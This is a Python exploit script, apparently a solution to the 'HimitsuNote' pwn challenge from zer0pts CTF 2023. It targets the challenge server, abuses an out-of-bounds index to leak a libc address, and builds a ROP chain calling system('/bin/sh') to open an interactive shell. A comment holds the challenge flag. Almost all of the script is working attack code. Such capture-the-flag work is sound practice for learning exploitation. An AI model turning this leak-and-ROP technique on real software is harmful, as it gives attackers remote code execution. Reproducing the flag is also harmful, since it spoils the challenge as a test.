#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'lremote', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', lremote = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        lremote = {'host':'localhost', 'port':9003}, \
                        remote  = {'host':'pwn.2023.zer0pts.com', 'port':9003})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        lremote = 'libc-2.31.so', \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_malloc_hook    = libc.symbols['__malloc_hook']
ofs_libc_mainarena      = ofs_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    hn = HimitsuNote(conn)

    hn.add(0)
    hn.add(6)

    hn.restart()

    hn.edit(9, p64(0))
    hn.add(37)

    hn.restart()
    if env.check(['debug', 'local']):
        libc.address = int(input('libc >'), 16)
    else:
        conn.recvuntil(b'transferring control: ')

        addr_libc_mainarena = u(conn.recv(6)) - 0x60
        libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    rop = ROP(libc)
    rop.system(addr_libc_str_sh)

    conn.sendlineafter(b'> ', b'2'+b'y'*0xbf)
    conn.sendlineafter(b'index: ', b'21')
    conn.sendlineafter(b'data: ', p64(rop.ret.address)*0x20 + bytes(rop))

    conn.sendline(b'0')

    conn.sendline(b'echo HOGE')
    conn.recvuntil(b'HOGE')

class HimitsuNote:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def add(self, idx):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())

    def edit(self, idx, data):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendlineafter(b'data: ', data)

    def restart(self):
        self.sendlineafter(b'> ', b'x'*0x50)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # zer0pts{I_h0p3_U_s0lv3d_th1s_ch4ll3ng3_w1th_4ddr3ss_l34k}

if __name__=='__main__':
    main()

#==========
